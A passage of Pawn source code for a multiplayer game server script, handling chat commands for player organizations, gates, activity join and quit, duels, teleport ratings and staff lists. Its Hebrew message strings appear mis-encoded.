				SendClientMessage(playerid,red," (рщя рЇ∙°х· ь∙чўя ьфЄщє ∙чўя с°ю· тщ∙х· тсхфф ю∙ьх)");
				return 1;
			}
			new id = ReturnUser(cmd,playerid), lvl = strval(cmd2);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(playerinfo[id][org] != playerinfo[playerid][org])
			{
				format(string,sizeof(string)," .ьр ЁюЎр ср°тхя ∙ьъ %s",GetName(id));
				return SendClientMessage(playerid,red,string);
			}
			if(lvl < 1 || lvl > 3) return SendClientMessage(playerid,red," .°юф ∙тхщф - ф°юф щыхьф ьфщх· сщя 1 ь 3");
			format(string,sizeof(string)," .ь %d %s ∙щЁф р· °ю· фтщ∙х· ∙ь %s",lvl,GetName(id),GetName(playerid));
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][org] == playerinfo[playerid][org]) SendClientMessage(i,orange,string);
			playerinfo[id][lorg] = lvl;
			if(playerinfo[id][logged]) fsetint(fuser(id),"OrgLevel",lvl);
		}
		else if(equal(cmd,"edit"))
		{
			if(playerinfo[playerid][org] == 0 || !orginfo[playerinfo[playerid][org]][orgvalid]) return SendClientMessage(playerid,red," .р·ф ьр ср°тхя °∙ющ");
			if(playerinfo[playerid][lorg] < 2) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· тщ∙х· 2");
			if(!orginfo[playerinfo[playerid][org]][ohashq]) return SendClientMessage(playerid,red," .ьр°тхя ∙ьъ рщя юЇўуф");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || IsNumeric(cmd))
			{
				SendClientMessage(playerid,white," /org edit [edit type] :Ўх°· ф∙щюх∙");
				SendClientMessage(playerid,white," foot - Є°щы· ющўхэ ф∙щтх° ьюЇўуф");
				SendClientMessage(playerid,white," vehicle - Є°щы· ющўхэ ф∙щтх° ьюЇўуф с°ыс");
				SendClientMessage(playerid,white," cmd - Є°щы· Їўху· ф∙щтх° ьюЇўу· фр°тхя");
				return 1;
			}
			if(equal(cmd,"cmd"))
			{
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd))
				{
					SendClientMessage(playerid,white," /org edit cmd [command] :Ўх°· ф∙щюх∙");
					SendClientMessage(playerid,white," / :щ∙ ь°∙хэ р· ∙э фЇўхуф ььр ёьр∙");
					return 1;
				}
				if(cmd[0] == '/' || cmd[0] == ' ') strdel(cmd,0,1);
				format(orginfo[playerinfo[playerid][org]][ocmd],M_S,cmd);
				format(string,sizeof(string)," .\"/%s\" ∙щЁф р· Їўху· ф∙щтх° ьюЇўу· фр°тхя ь %s",orginfo[playerinfo[playerid][org]][ocmd],GetName(playerid));
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][org] == playerinfo[playerid][org]) SendClientMessage(i,orange,string);
				format(string,sizeof(string),"/DM/Organizations/%s.ini",orginfo[playerinfo[playerid][org]][oname]);
				fsetstring(string,"Command",orginfo[playerinfo[playerid][org]][ocmd]);
			}
			else if(equal(cmd,"foot"))
			{
				new Float:p[4];
				GetPlayerPos(playerid,p[0],p[1],p[2]);
				GetPlayerFacingAngle(playerid,p[3]);
				for(new i=0;i<4;i++) orginfo[playerinfo[playerid][org]][ohq][i] = p[i];
				format(string,sizeof(string)," .∙щЁф р· ющўхэ ф∙щтх° ьюЇўу· фр°тхя %s",GetName(playerid));
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][org] == playerinfo[playerid][org]) SendClientMessage(i,orange,string);
				format(string,sizeof(string),"/DM/Organizations/%s.ini",orginfo[playerinfo[playerid][org]][oname]);
				fsetfloat(string,"X",orginfo[playerinfo[playerid][org]][ohq][0]);
				fsetfloat(string,"Y",orginfo[playerinfo[playerid][org]][ohq][1]);
				fsetfloat(string,"Z",orginfo[playerinfo[playerid][org]][ohq][2]);
				fsetfloat(string,"Rot",orginfo[playerinfo[playerid][org]][ohq][3]);
			}
			else if(equal(cmd,"vehicle"))
			{
				if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· с°ыс");
				new Float:p[4];
				GetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]);
				GetVehicleZAngle(GetPlayerVehicleID(playerid),p[3]);
				for(new i=0;i<4;i++) orginfo[playerinfo[playerid][org]][ohqv][i] = p[i];
				format(string,sizeof(string)," .∙щЁф р· ющўхэ ф∙щтх° ьюЇўу· фр°тхя с°ыс %s",GetName(playerid));
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][org] == playerinfo[playerid][org]) SendClientMessage(i,orange,string);
				format(string,sizeof(string),"/DM/Organizations/%s.ini",orginfo[playerinfo[playerid][org]][oname]);
				fsetfloat(string,"VX",orginfo[playerinfo[playerid][org]][ohqv][0]);
				fsetfloat(string,"VY",orginfo[playerinfo[playerid][org]][ohqv][1]);
				fsetfloat(string,"VZ",orginfo[playerinfo[playerid][org]][ohqv][2]);
				fsetfloat(string,"VR",orginfo[playerinfo[playerid][org]][ohqv][3]);
			}
			else return SendClientMessage(playerid,red," .рЇ∙°х· Є°щы· р°тхя ∙тхщф");
		}
		else if(equal(cmd,"members"))
		{
			new orgid;
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || IsNumeric(cmd))
			{
				SendClientMessage(playerid,white," /org members [org name] :Ўх°· ф∙щюх∙");
				SendClientMessage(playerid,white," (фр°тхя щфщф фр°тхя ∙ьъ org name сющуф хьр щщ°∙э)");
			}
			if(!strlen(cmd))
			{
				if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхс° х°∙хэ");
				if(!playerinfo[playerid][org] || !orginfo[playerinfo[playerid][org]][orgvalid]) return SendClientMessage(playerid,red," .р·ф ьр ср°тхя");
				else
				{
					format(string,sizeof(string),"/DM/Organizations/%s.ini",orginfo[playerinfo[playerid][org]][oname]);
					orgid = fgetint(string,"ID");
				}
			}
			else
			{
				format(string,sizeof(string),"/DM/Organizations/%s.ini",cmd);
				if(!fexist(string)) return SendClientMessage(playerid,red," .р°тхя ∙тхщ");
				else orgid = fgetint(string,"ID");
			}
			format(orginfo[orgid][oname],256,fgetstring(string,"Name"));
			format(string,sizeof(string)," ~~~ :\"%s\" чс°щ фр°тхя ~~~",orginfo[orgid][oname]);
			SendClientMessage(playerid,lightblue,string);
			new c = 0;
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][org] == orgid)
			{
				format(string,sizeof(string)," Х %d. %s (ID: %03d | Org. Level: %d)",++c,GetName(i),i,playerinfo[i][lorg]);
				SendClientMessage(playerid,playerinfo[i][lorg] == 3 ? orange : yellow,string);
			}
			if(!c) return SendClientMessage(playerid,red," .рщя ∙чўЁщэ ючхс°щэ юр°тхя цф");
		}
		else if(equal(cmd,"settag"))
		{
			if(playerinfo[playerid][org] == 0 || !orginfo[playerinfo[playerid][org]][orgvalid]) return SendClientMessage(playerid,red," .р·ф ьр ср°тхя °∙ющ");
			if(playerinfo[playerid][lorg] < 2) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· тщ∙х· 2");
			new ctag[256];
			cmd = strtok(cmdtext,idx), ctag = strrest(cmdtext,idx);
			if(!strlen(cmd) || !strlen(ctag))
			{
				SendClientMessage(playerid,white," /org settag [id/name] [tag] :Ўх°· ф∙щюх∙");
				return SendClientMessage(playerid,white," ыущ ьфх°щу р· ф·рт X °∙хэ р· ф·рт");
			}
			new id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(playerinfo[id][org] != playerinfo[playerid][org])
			{
				format(string,sizeof(string)," .ьр ЁюЎр ср°тхя ∙ьъ %s",GetName(id));
				return SendClientMessage(playerid,red,string);
			}
			if(playerinfo[playerid][lorg] < playerinfo[id][lorg]) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ь∙Ёх· р· ф·рт ср°тхя ью∙·ю∙щэ с°ю· тщ∙х· тсхфф ю∙ьъ");
			if(strlen(ctag) > 10) return SendClientMessage(playerid,red," .фрх°ъ фюўёщюрьщ ь·рт фхр 10 ·хщэ");
			if(equal(ctag,"X"))
			{
				format(string,sizeof(string)," .%s ючў· р· ·рт фр°тхя ∙ь",GetName(id));
				SendClientMessage(playerid,green,string);
				format(string,sizeof(string)," .ючў р· ·рт фр°тхя ∙ьъ %s",GetName(playerid));
				SendClientMessage(id,green,string);
				playerinfo[id][orgtag][0] = 0;
				if(playerinfo[id][logged]) fsetstring(fuser(id),"OrgTag","X");
			}
			else
			{
				format(string,sizeof(string)," :ь %s ∙щЁщ· р· ·рт фр°тхя ∙ь",GetName(id));
				SendClientMessage(playerid,green,string);
				SendClientMessage(playerid,green,ctag);
				format(string,sizeof(string)," :∙щЁф р· ·рт фр°тхя ∙ьъ ь %s",GetName(playerid));
				SendClientMessage(id,green,string);
				SendClientMessage(id,green,ctag);
				format(playerinfo[id][orgtag],16,ctag);
				if(playerinfo[id][logged]) fsetstring(fuser(id),"OrgTag",ctag);
			}
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· р°тхя ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/oog"))
	{
		new theGate = -1;
		if(!playerinfo[playerid][org]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ср°тхя");
		if(!orginfo[playerinfo[playerid][org]][oobjects]) return SendClientMessage(playerid,red," .ьр°тхя ∙ьъ рщя рхсщщўшщэ");
		for(new i = 0, j = playerinfo[playerid][org]; i < orginfo[i][oobjects] && theGate == -1; i++) if(GetPlayerDistanceToPoint(playerid,objectinfo[orginfo[j][oobject][i]][opos][0],objectinfo[orginfo[j][oobject][i]][opos][1]) <= 14.0 && objectinfo[orginfo[j][oobject][i]][omoving][0] && objectinfo[orginfo[j][oobject][i]][oorg] == j && IsValidSObject(orginfo[j][oobject][i])) theGate = orginfo[j][oobject][i];
		if(theGate == -1) return SendClientMessage(playerid,red," .рщя ьщуъ ∙хэ рхсщщўш ∙р·ф юёхть ьЇ·хч");
		if(objectinfo[theGate][omoving][2]) return SendClientMessage(playerid,red," .фрхсщщўш фцф ыс° Ї·хч");
		StopSObject(theGate);
		MoveSObject(theGate,objectinfo[theGate][omoveto][0],objectinfo[theGate][omoveto][1],objectinfo[theGate][omoveto][2],3.5);
		objectinfo[theGate][omoving][2] = 1;
		PlaySound(playerid,1153);
		playerinfo[playerid][hearinggate] = theGate;
		return 1;
	}
	if(equal(cmd,"/ocg"))
	{
		new theGate = -1;
		if(!playerinfo[playerid][org]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ср°тхя");
		if(!orginfo[playerinfo[playerid][org]][oobjects]) return SendClientMessage(playerid,red," .ьр°тхя ∙ьъ рщя рхсщщўшщэ");
		for(new i = 0, j = playerinfo[playerid][org]; i < orginfo[i][oobjects] && theGate == -1; i++) if(GetPlayerDistanceToPoint(playerid,objectinfo[orginfo[j][oobject][i]][opos][0],objectinfo[orginfo[j][oobject][i]][opos][1]) <= 14.0 && objectinfo[orginfo[j][oobject][i]][omoving][0] && objectinfo[orginfo[j][oobject][i]][oorg] == j && IsValidSObject(orginfo[j][oobject][i])) theGate = orginfo[j][oobject][i];
		if(theGate == -1) return SendClientMessage(playerid,red," .рщя ьщуъ ∙хэ рхсщщўш ∙р·ф юёхть ьётх°");
		if(!objectinfo[theGate][omoving][2]) return SendClientMessage(playerid,red," .фрхсщщўш фцф ыс° ётх°");
		StopSObject(theGate);
		MoveSObject(theGate,objectinfo[theGate][opos][0],objectinfo[theGate][opos][1],objectinfo[theGate][opos][2],3.5);
		objectinfo[theGate][omoving][2] = 0;
		PlaySound(playerid,1153);
		playerinfo[playerid][hearinggate] = theGate;
		return 1;
	}
	if(equal(cmd,"/oogall"))
	{
		if(!playerinfo[playerid][org]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ср°тхя");
		if(!orginfo[playerinfo[playerid][org]][oobjects]) return SendClientMessage(playerid,red," .ьр°тхя ∙ьъ рщя рхсщщўшщэ");
		new c = 0, string[M_S];
		for(new i = 0, j = playerinfo[playerid][org]; i < orginfo[i][oobjects]; i++) if(objectinfo[orginfo[j][oobject][i]][omoving][0] && !objectinfo[orginfo[j][oobject][i]][omoving][2] && IsValidSObject(orginfo[j][oobject][i]))
		{
			StopSObject(orginfo[j][oobject][i]);
			MoveSObject(orginfo[j][oobject][i],objectinfo[orginfo[j][oobject][i]][omoveto][0],objectinfo[orginfo[j][oobject][i]][omoveto][1],objectinfo[orginfo[j][oobject][i]][omoveto][2],3.5);
			c++;
		}
		if(!c) return SendClientMessage(playerid,red," .Ї·щч· ыь фрхсщщўшщэ Ёы∙ьф");
		format(string,sizeof(string)," .Ї·ч р· ыь фрхсщщўшщэ ∙ь юЇўу· фр°тхя %s",GetName(playerid));
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][org] == playerinfo[playerid][org]) SendClientMessage(i,orange,string);
		return 1;
	}
	if(equal(cmd,"/ocgall"))
	{
		if(!playerinfo[playerid][org]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ср°тхя");
		if(!orginfo[playerinfo[playerid][org]][oobjects]) return SendClientMessage(playerid,red," .ьр°тхя ∙ьъ рщя рхсщщўшщэ");
		new c = 0, string[M_S];
		for(new i = 0, j = playerinfo[playerid][org]; i < orginfo[i][oobjects]; i++) if(objectinfo[orginfo[j][oobject][i]][omoving][0] && objectinfo[orginfo[j][oobject][i]][omoving][2] && IsValidSObject(orginfo[j][oobject][i]))
		{
			StopSObject(orginfo[j][oobject][i]);
			MoveSObject(orginfo[j][oobject][i],objectinfo[orginfo[j][oobject][i]][opos][0],objectinfo[orginfo[j][oobject][i]][opos][1],objectinfo[orginfo[j][oobject][i]][opos][2],3.5);
			c++;
		}
		if(!c) return SendClientMessage(playerid,red," .ётщ°· ыь фрхсщщўшщэ Ёы∙ьф");
		format(string,sizeof(string)," .ёт° р· ыь фрхсщщўшщэ ∙ь юЇўу· фр°тхя %s",GetName(playerid));
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][org] == playerinfo[playerid][org]) SendClientMessage(i,orange,string);
		return 1;
	}
	if(equal(cmd,"/orgs"))
	{
		new orgs = 0, orgCM = 0, c = 0, list[M_S_D];
		for(new i=1;i<MAX_ORGS;i++) if(orginfo[i][orgvalid]) orgs++;
		if(!orgs) return SendClientMessage(playerid,red," .рщя р°тхЁщэ с∙°· ы°тЄ");
		format(list,sizeof(list),@c(lightblue) " - :(р°тхЁщэ с∙°· (%d -\n",orgs);
		for(new i=1;i<MAX_ORGS;i++) if(orginfo[i][orgvalid])
		{
			orgCM = 0;
			for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && playerinfo[ii][org] == i) orgCM++;
			format(list,sizeof(list),"%s\n %02d) \"%s\" (Connected members: %d, OrgID: %d)",list,++c,orginfo[i][oname],orgCM,i);
			//format(string,sizeof(string)," %02d) \"%s\" (Connected members: %d, OrgID: %d)",++c,orginfo[i][oname],orgCM,i);
		}
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "°∙щю· р°тхЁщэ",list,"OK","");
		return 1;
	}
	if(equal(cmd,"/wtypes"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхс° ь∙щюх∙ сЇўхуф цх");
		new list[512];
		for(new i = 0; i < max_wtypes; i++) format(list,sizeof(list),!strlen(list) ? ("%s {%s}Х %s - {%s}%s") : ("%s\r\n {%s}Х %s - {%s}%s"),list,HexStringOfColor(red),WeaponTypes[i][wtName],HexStringOfColor(lightred),WeaponName(playerinfo[playerid][wtype][i]));
		ShowPlayerDialog(playerid,dialog_wtype,DIALOG_STYLE_LIST,@c(lightblue) "°∙щю· Ё∙ўщэ юхЄуЇщэ",list,"∙щЁхщ","щЎщрф");
		return 1;
	}
	if(equal(cmd,"/youtube"))
	{
		if(!equal(GetName(playerid),"(gmR)Amit")) return SendClientMessage(playerid,red,"Coming soon...");
		return ShowPlayerDialog(playerid,dialog_youtube,DIALOG_STYLE_LIST,@c(black) "You" @c(red) "Tube" @c(lightblue) " юхцщўф ю·хъ",GetPlayerState(playerid) == PLAYER_STATE_DRIVER ? ("ф∙юЄ· юхцщўф\nфЇёў· юхцщўф\nф∙юЄ· юхцщўф с°ущх\nыщсхщ ф°ущх") : ("ф∙юЄ· юхцщўф\nфЇёў· юхцщўф"),"счщ°ф","щЎщрф");
	}
	if(equal(cmd,"/music"))
	{
		if(!equal(GetName(playerid),"(gmR)Amit")) return SendClientMessage(playerid,red,"Coming soon...");
		if(Options[12][optActive]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙ющЄ юхцщўф ыщ рхЇЎщщ· сщшхь ёрхЁущэ ЇЄщьф");
		if(!playerinfo[playerid][setting][setting_sounds]) return SendClientMessage(playerid,red," /setting ьр Ёщ·я ьф∙ющЄ юхцщўф ыщ сщшь· Ўьщьщэ юфюху сЇўхуф");
		if(IsPlayerAFK_(playerid)) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙ющЄ юхцщўф ы∙р·ф сюЎс");
		SendClientMessage(playerid,lightred," .Єьщъ ьсчх° юхцщўф у°ъ ф°∙щюф ∙ьЇЁщщъ. ыь ф∙щ°щэ ∙юхЇщЄщэ ыря ЁхЎ°х Єь щущ рхюЁщэ хцю°щэ хьр Єь щущЁх");
		SendClientMessage(playerid,lightred," !фцыхщх· фюьрх· фхьых· рьщфэ");
		if(playerinfo[playerid][playingmusic]) SendClientMessage(playerid,red," .∙щэ ьс! ф∙юЄ· юхцщўф ·сшь р· фюхцщўф ∙р·ф ∙хюЄ ы°тЄ");
		ShowPlayerConstDialog(playerid,dialog_music);
		return 1;
	}
	if(equal(cmd,"/reloadmusic") && IsPlayerMAdmin(playerid)) return ReloadMusic();
	if(equal(cmd,"/join"))
	{
		if(!thereIsAct) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ы°тЄ");
		new str[32];
		if(raceinfo[0]) str = "/racing join";
		else if(warinfo[0]) str = "/swar join";
		else if(wweinfo[0]) str = "/wwe join";
		else if(kartinfo[0]) str = "/kart join";
		else if(monsterinfo[0]) str = "/monster join";
		else if(sraceinfo[0]) format(str,sizeof(str),"%s join",SRaceTypes[sraceinfo[5]][srCommand]);
		else if(kickstarinfo[0]) str = "/kickstar join";
		else if(ewarinfo[0]) str = "/ewar join";
		else if(wargameinfo[0]) format(str,sizeof(str),"%s join",warGames[wargameinfo[4]][wgCommand]);
		else if(manhuntinfo[0]) format(str,sizeof(str),"%s join",ManhuntTypes[manhuntinfo[4]][mhCommand]);
		else if(sportinfo[0]) str = "/sport join";
		else if(armyinfo[0]) str = "/army join";
		else if(teamactinfo[0]) format(str,sizeof(str),"%s join",TeamActivities[teamactinfo[4]][taCommand]);
		else if(zombiesinfo[0]) str = "/zombies join";
		else if(glassinfo[0]) str = "/glass join";
		else if(currentShow[0] != -1) str = "/show join";
		else if(briefcaseinfo[0]) str = "/bc join";
		if(strlen(str) > 0) command(playerid,str);
		return 1;
	}
	if(equal(cmd,"/aquit"))
	{
		if(!thereIsAct) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ы°тЄ");
		new str[32];
		if(raceinfo[0]) str = "/racing quit";
		else if(warinfo[0]) str = "/swar quit";
		else if(wweinfo[0]) str = "/wwe quit";
		else if(kartinfo[0]) str = "/kart quit";
		else if(monsterinfo[0]) str = "/monster quit";
		else if(sraceinfo[0]) format(str,sizeof(str),"%s quit",SRaceTypes[sraceinfo[5]][srCommand]);
		else if(kickstarinfo[0]) str = "/kickstar quit";
		else if(ewarinfo[0]) str = "/ewar quit";
		else if(wargameinfo[0]) format(str,sizeof(str),"%s quit",warGames[wargameinfo[4]][wgCommand]);
		else if(manhuntinfo[0]) format(str,sizeof(str),"%s quit",ManhuntTypes[manhuntinfo[4]][mhCommand]);
		else if(sportinfo[0]) str = "/sport quit";
		else if(armyinfo[0]) str = "/army quit";
		else if(teamactinfo[0]) format(str,sizeof(str),"%s quit",TeamActivities[teamactinfo[4]][taCommand]);
		else if(zombiesinfo[0]) str = "/zombies quit";
		else if(glassinfo[0]) str = "/glass quit";
		else if(currentShow[0] != -1) str = "/show quit";
		else if(briefcaseinfo[0]) str = "/bc quit";
		if(strlen(str) > 0) command(playerid,str);
		return 1;
	}
	if(equal(cmd,"/astats"))
	{
		if(!thereIsAct) return SendClientMessage(playerid,red," .рщя ЇЄщьх· ы°тЄ");
		new string[M_S], c = 0;
		SendClientMessage(playerid,lightblue," ~~~ :ю∙··Їщэ сЇЄщьх· ~~~");
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inact])
		{
			format(string,sizeof(string)," Х %d) %s [ID %03d]",++c,GetName(i),i);
			SendClientMessage(playerid,c % 2 == 0 ? white : grey,string);
		}
		if(!c) return SendClientMessage(playerid,red," .рщя ю∙··Їщэ");
		return 1;
	}
	if(equal(cmd,"/accept"))
	{
		if(!playerinfo[playerid][lastrec]) return SendClientMessage(playerid,red," .ьр ўщсь· ∙хэ фцюЁф");
		new str[32];
		switch(playerinfo[playerid][lastrec])
		{
			case 1: str = "/drift accept";
			case 2: str = "/prace accept";
			case 3: str = "/duel accept";
			case 4: str = "/gang accept";
			//case 5: str = "/clan accept";
			case 6: str = "/team accept";
			case 7: str = "/org accept";
		}
		if(strlen(str) > 0) command(playerid,str);
		return 1;
	}
	if(equal(cmd,"/cancel"))
	{
		if(!playerinfo[playerid][lastrec]) return SendClientMessage(playerid,red," .ьр ўщсь· ∙хэ фцюЁф");
		new str[32];
		switch(playerinfo[playerid][lastrec])
		{
			case 1: str = "/drift cancel";
			case 2: str = "/prace cancel";
			case 3: str = "/duel cancel";
			case 4: str = "/gang cancel";
			//case 5: str = "/clan cancel";
			case 6: str = "/team cancel";
			case 7: str = "/org cancel";
		}
		if(strlen(str) > 0) command(playerid,str);
		return 1;
	}
	if(equal(cmd,"/again"))
	{
		if(!playerinfo[playerid][lastaga]) return SendClientMessage(playerid,red," .ьр сщЎЄ· ∙хэ ЇЄхьф ∙рЇ∙° ьчцх° Єьщф ьрч°хЁф");
		new string[M_S];
		switch(playerinfo[playerid][lastaga])
		{
			case 1:
			{
				switch(playerinfo[playerid][bstyle][0])
				{
					case 0: format(string,sizeof(string),".%s фцющя рх·ъ ьў°с Єэ фЁ∙ў %s",Ammunation[playerinfo[playerid][bstyle][1]][aName],GetName(playerid));
					case 1: format(string,sizeof(string),".%s фцющя рх·ъ ьў°с юёхт %s",BattleStyles[playerinfo[playerid][bstyle][1]][bsName],GetName(playerid));
					case 2: format(string,sizeof(string),".%s фцющя рх·ъ ьў°с °ысщэ юёхт %s",VBattleStyles[playerinfo[playerid][bstyle][1]][vbsName],GetName(playerid));
				}
				format(string,sizeof(string)," /accept рх /duel accept :ьрщ∙х° ф∙·ю∙ сЇўхуф %s",string);
				SendClientMessage(playerinfo[playerid][duelclick],green,string);
				switch(playerinfo[playerid][bstyle][0])
				{
					case 0: format(string,sizeof(string)," .сцщ°ф юёЇ° %d %s ьў°с юёхт %s фцюЁ· р·",playerinfo[playerid][bplace],Ammunation[playerinfo[playerid][bstyle][1]][aName],GetName(playerinfo[playerid][duelclick]));
					case 1: format(string,sizeof(string)," .сцщ°ф юёЇ° %d %s ьў°с юёхт %s фцюЁ· р·",playerinfo[playerid][bplace],BattleStyles[playerinfo[playerid][bstyle][1]][bsName],GetName(playerinfo[playerid][duelclick]));
					case 2: format(string,sizeof(string)," .%s ьў°с °ысщэ юёхт %s фцюЁ· р·",VBattleStyles[playerinfo[playerid][bstyle][1]][vbsName],GetName(playerinfo[playerid][duelclick]));
				}
				SendClientMessage(playerid,green,string);
				playerinfo[playerinfo[playerid][duelclick]][binvited] = playerid, playerinfo[playerid][binvited] = playerinfo[playerid][duelclick], playerinfo[playerid][btime] = 0, playerinfo[playerid][binviter] = 1;
				playerinfo[playerinfo[playerid][duelclick]][lastrec] = 3;
			}
		}
		return 1;
	}
	if(equal(cmd,"/tl"))
	{
		if(playerinfo[playerid][lasttele] == -1) return SendClientMessage(playerid,red," .ьр ф∙·т°· ь∙хэ юўхэ");
		return Teleport(playerid,playerinfo[playerid][lasttele]);
	}
	if(equal(cmd,"/rate"))
	{
		if(playerinfo[playerid][lasttele] == -1) return SendClientMessage(playerid,red," .ьр ф∙·т°· ь∙хэ юўхэ");
		new string[300], header[64];
		if(playerinfo[playerid][rated][playerinfo[playerid][lasttele]])
		{
			format(string,sizeof(string)," .ьрч°хЁф, ·хыь ьу°т рх·х ∙хс сыЁщёф фсрф ∙ьъ ь∙°· %s ыс° ущ°т· р· ф∙щтх°",Teleports[playerinfo[playerid][lasttele]][Tcmd]);
			return SendClientMessage(playerid,red,string);
		}
		for(new i = 0; i < sizeof(TeleportRating); i++) format(string,sizeof(string),!i ? ("%sRating: %d\t{%s}%s") : ("%s\nRating: %d\t{%s}%s"),string,TeleportRating[i][Tratescore],HexStringOfColor(yellow),TeleportRating[i][Tratename]);
		format(header,sizeof(header),@c(lightblue) "%s ущ°хт ф∙щтх°",Teleports[playerinfo[playerid][lasttele]][Tcmd]);
		ShowPlayerDialog(playerid,dialog_rate,DIALOG_STYLE_LIST,header,string,"!у°т","ётх°");
		return 1;
	}
	if(equal(cmd,"/life"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_info || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Їўхуф цх юх·°· °ў ы∙р·ф ЁюЎр сющуЄхя");
		if(GetMoney(playerid) < 5) return SendClientMessage(playerid,red," .∙щюх∙ сЇўхуф цх Єхьф 5$");
		SetPlayerHealth(playerid,100.0);
		GiveMoney(playerid,0-5,17 );
		SendClientMessage(playerid,green," .ўЁщ· чщщэ");
		return 1;
	}
	if(equal(cmd,"/arm"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_info || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Їўхуф цх юх·°· °ў ы∙р·ф ЁюЎр сющуЄхя");
		if(GetMoney(playerid) < 8) return SendClientMessage(playerid,red," .∙щюх∙ сЇўхуф цх Єхьф 8$");
		SetPlayerArmour(playerid,100.0);
		GiveMoney(playerid,0-8,17);
		SendClientMessage(playerid,green," .ўЁщ· ютя");
		return 1;
	}
	if(equal(cmd,"/find"))
	{
		new allplaces[512];
		for(new i = 0; i < MAX_PLACES; i++) if(placeinfo[i][plValid]) format(allplaces,sizeof(allplaces),!strlen(allplaces) ? ("%s%d) %s") : ("%s\n%d) %s"),allplaces,i+1,placeinfo[i][plName]);
		ShowPlayerDialog(playerid,dialog_places,DIALOG_STYLE_LIST,@c(lightblue) "юўхюх·",allplaces,"рЇ∙°хщх·","щЎщрф");
		return 1;
	}
	if(equal(cmd,"/findoff"))
	{
		if(!playerinfo[playerid][usedfind]) return SendClientMessage(playerid,red," .ьр ёщюЁ· ∙хэ ющўхэ");
		RemovePlayerMapIcon(playerid,icon_place);
		SendClientMessage(playerid,green," .фющўхэ ∙сч°· ьёюя Ёючў юфюЇф");
		return 1;
	}
	if(equal(cmd,"/vstation"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_vstation || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Їўхуф цх юх·°· °ў ы∙р·ф ЁюЎр сющуЄхя");
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .Єьщъ ьфщх· Ёфт с°ыс");
		if(GetMoney(playerid) < 4) return SendClientMessage(playerid,red," .∙щюх∙ сЇўхуф цх Єхьф 4$");
		RepairVehicle(GetPlayerVehicleID(playerid));
		GiveMoney(playerid,0-4,17);
		PlaySound(playerid,1133);
		SendClientMessage(playerid,green," .·щўЁ· р· ф°ыс");
		return 1;
	}
	if(equal(cmd,"/?") || equal(cmd,"/question"))
	{
		if(IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .рщЁъ Ў°щъ ьф∙·ю∙ сЇўхуф фцх");
		if(fexist(fuser(playerid)) && !playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхс° ь∙щюх∙ сЇўхуф цх");
		new admins = 0;
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && ((IsPlayerMAdmin(i) && playerinfo[i][showme]) || PlayerHasRank(i,RankID("Ўхх· ф∙°·")))) admins++;
		if(!admins) return SendClientMessage(playerid,red," .рщя рч°рщ ·ющыф ючхс°щэ хьыя ьр Ёщ·я ь∙рхь ыЄ· ∙рьф");
		ShowPlayerDialog(playerid,dialog_question,DIALOG_STYLE_INPUT,@c(lightblue) "?",":фўьу ыря р· ф∙рьф ∙ьъ","∙ьч","сщшхь");
		return 1;
	}
	if(equal(cmd, "/staff"))
	{
		new string[M_S_D], str[M_S], staff;
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && PlayerHasRank(i, RankID("Ўхх· ф∙°·")) && !IsPlayerMAdmin(i))
		{
		    staff++;
            format(str,sizeof(str),"{27DE55}%d. %s [ID: %03d%s]\n",staff,GetName(i),i,!IsPlayerAFK_(i)? (""):(" {C0C0C0}- AFK{27DE55}"));
